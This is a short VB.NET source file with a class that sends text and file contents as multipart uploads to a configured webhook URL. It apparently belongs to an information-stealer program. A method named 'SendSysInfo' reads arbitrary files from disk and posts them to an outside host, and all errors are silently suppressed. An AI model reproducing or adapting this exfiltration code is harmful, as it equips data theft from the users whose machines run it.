﻿Imports System
Imports System.IO
Imports System.Net
Imports System.Net.Http
Class NewWebhook
    Public Shared webhookk As String = St.webhook
    Public Shared name As String = St.hash
    Private _Client As HttpClient
    Private _URL As String
    Public Property _name As String
    Public Sub New(ByVal _webhookUrl As String)
        _Client = New HttpClient()
        _URL = _webhookUrl
    End Sub

    Public Function SendSysInfo(ByVal content As String, ByVal stringg As String, ByVal filee As String) As Boolean
        Try
            Dim data As MultipartFormDataContent = New MultipartFormDataContent()
            data.Add(New StringContent(_name), "username")
            data.Add(New StringContent(content), "content")

            If filee IsNot Nothing Then
                Dim bytes As Byte() = File.ReadAllBytes(filee)
                data.Add(New ByteArrayContent(bytes), filee, stringg)
            End If

            Dim resp = _Client.PostAsync(_URL, data).Result
            Return resp.StatusCode = HttpStatusCode.NoContent
        Catch ex As Exception

        End Try

    End Function
    Public Function sendst(ByVal content As String) As Boolean
        Try
            Dim data As MultipartFormDataContent = New MultipartFormDataContent()
            data.Add(New StringContent(_name), "username")
            data.Add(New StringContent(content), "content")
            Dim resp = _Client.PostAsync(_URL, data).Result
            Return resp.StatusCode = HttpStatusCode.NoContent
        Catch ex As Exception

        End Try

    End Function
End Class

